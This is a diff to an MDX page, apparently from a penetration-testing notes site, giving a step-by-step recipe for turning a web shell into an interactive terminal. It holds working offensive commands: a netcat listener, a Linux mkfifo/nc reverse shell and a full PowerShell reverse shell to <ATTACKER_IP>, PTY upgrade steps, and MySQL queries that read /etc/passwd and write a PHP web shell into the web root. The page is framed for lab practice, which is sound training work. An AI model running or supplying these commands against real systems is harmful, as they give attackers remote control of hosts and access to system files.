@@ -9,6 +9,73 @@ hideFooterPagination: true
 
 {/* Generated from Commands/web-shell-to-terminal.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Web shell → terminal: choose the operation and read the result
+
+Run a listener on Kali, connect back from the web shell, then upgrade the terminal using the matching OS path. Linux PTY steps apply only to Linux; the Windows PowerShell reverse shell is a basic command channel. For a usable Windows remoting session, use Evil-WinRM when you have credentials and WinRM access.
+
+### What the result establishes
+
+Prove command execution and network direction separately, then establish a usable shell and verify identity.
+
+### Prerequisites and common failures
+
+A web response, a TCP callback and an interactive terminal are different stages; shell syntax and listener/payload compatibility matter.
+
+### Example 1: 1. Kali — listen
+
+Run in: **Kali**. Use the Kali/VPN IP that the target can reach; keep this terminal open.
+
+```bash
+sudo nc -lvnp 443
+```
+
+### Example 2: 2a. Linux web shell — connect back
+
+Run in: **Linux web-shell command field**. Replace &lt;ATTACKER_IP>. When the connection arrives on Kali, follow the Full TTY upgrade below.
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 443 > /tmp/f
+```
+
+### Example 3: 2b. Windows web shell — connect back
+
+Run in: **Windows web-shell command field (cmd.exe)**. Choose 2a OR 2b. A waiting web request can be normal while the shell is connected; check the Kali listener before submitting again.
+
+```text
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+### Example 4: 3. Linux target — start a PTY
+
+Run in: **New Linux shell in Kali**. Then press Ctrl-Z to return to your local Kali prompt.
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+### Example 5: 4. Kali — restore the connection in raw mode
+
+Run in: **Local Kali terminal**. Remember the rows/columns from stty size. Press Enter once or twice after fg.
+
+```bash
+stty size
+stty raw -echo; fg
+```
+
+### Example 6: 5. Linux target — finish TTY setup
+
+Run in: **Remote Linux shell**. Replace ROWS and COLUMNS with the numbers from Kali. If your local terminal is broken after disconnecting, run stty sane; reset on Kali.
+
+```bash
+export TERM=xterm
+export SHELL=/bin/bash
+stty rows ROWS columns COLUMNS
+```
+
+## Saved commands and notebook recipes
+
+Run a listener on Kali, connect back from the web shell, then upgrade the terminal using the matching OS path. Linux PTY steps apply only to Linux; the Windows PowerShell reverse shell is a basic command channel. For a usable Windows remoting session, use Evil-WinRM when you have credentials and WinRM access.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=web-shell-to-terminal) · [All tools](/index)
@@ -20,6 +87,13 @@ Replace UPPER_CASE values with your lab values.
 ```bash
 sudo nc -lvnp 443
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Netcat Listener (Attack Box)](/exploitation/shells-payloads-cheat-sheet#netcat-listener-attack-box)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Use the Kali/VPN IP that the target can reach; keep this terminal open.
 
@@ -41,6 +115,13 @@ Replace &lt;ATTACKER_IP>. When the connection arrives on Kali, follow the Full T
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — PowerShell Reverse Shell One-Liner (Windows Target)](/exploitation/shells-payloads-cheat-sheet#powershell-reverse-shell-one-liner-windows-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 Choose 2a OR 2b. A waiting web request can be normal while the shell is connected; check the Kali listener before submitting again.
 
 ## 3. Linux target — start a PTY
@@ -50,6 +131,13 @@ Choose 2a OR 2b. A waiting web request can be normal while the shell is connecte
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTB Nibbles: Walkthrough and Report — Exploitation steps](/cheatsheets/nibbles#exploitation-steps) · [HTB Nibbles: Walkthrough and Report — Technical walkthrough](/cheatsheets/nibbles#technical-walkthrough) · [Shells, Payloads, and Interactive TTYs — Spawning Interactive TTY Shells](/exploitation/shells-payloads-cheat-sheet#spawning-interactive-tty-shells)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Then press Ctrl-Z to return to your local Kali prompt.
 
@@ -105,6 +193,13 @@ SELECT LOAD_FILE('/etc/passwd');
 SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Example 5: From DB access to the filesystem (and RCE)](/enumeration/mysql-mariadb-cheat-sheet#example-5-from-db-access-to-the-filesystem-and-rce) · [MySQL and MariaDB Enumeration — From DB access to the filesystem (and RCE)](/enumeration/mysql-mariadb-cheat-sheet#from-db-access-to-the-filesystem-and-rce)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
@@ -114,3 +209,14 @@ SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 - [Windows → Kali reverse shell](/commands/windows-reverse-shell)
 - [Upgrade a Linux shell](/commands/shell-upgrade)
 - [Evil-WinRM](/commands/evil-winrm)
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
+- [Windows → Kali reverse shell](/commands/windows-reverse-shell)
+- [Upgrade a Linux shell](/commands/shell-upgrade)
+- [Evil-WinRM](/commands/evil-winrm)
+
+{/* VAULT_RELATED_END */}
